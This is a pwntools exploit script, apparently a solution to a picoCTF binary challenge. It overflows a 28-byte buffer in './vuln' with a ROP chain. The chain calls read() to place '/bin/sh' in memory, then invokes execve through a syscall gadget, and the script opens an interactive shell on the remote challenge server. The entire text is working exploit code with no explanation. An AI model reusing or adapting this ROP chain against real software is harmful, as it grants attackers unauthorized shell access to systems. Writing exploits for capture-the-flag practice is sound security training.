from pwn import *
import time
exe = context.binary = ELF("./vuln")
r = process()
r = remote("saturn.picoctf.net",53848)
rop = ROP(exe)
# rop.raw(0x0804fb80) # xor eax eax
pop_eax_edx_ebx = 0x080583b8
pop_ecx = 0x08049e29
syscall = 0x8071640
rop.raw(b"A" * 28)
rop.raw(pop_eax_edx_ebx)
rop.raw(3)
rop.raw(0xff)
rop.raw(0x0)
rop.raw(pop_ecx)
rop.raw(0x080e5060)
rop.raw(syscall)
rop.raw(pop_eax_edx_ebx)
rop.raw(11)
rop.raw(0)
rop.raw(0x080e5060)
rop.raw(pop_ecx)
rop.raw(0)
rop.raw(syscall)
r.sendline(rop.chain())
r.send("/bin/sh\x00")
r.interactive()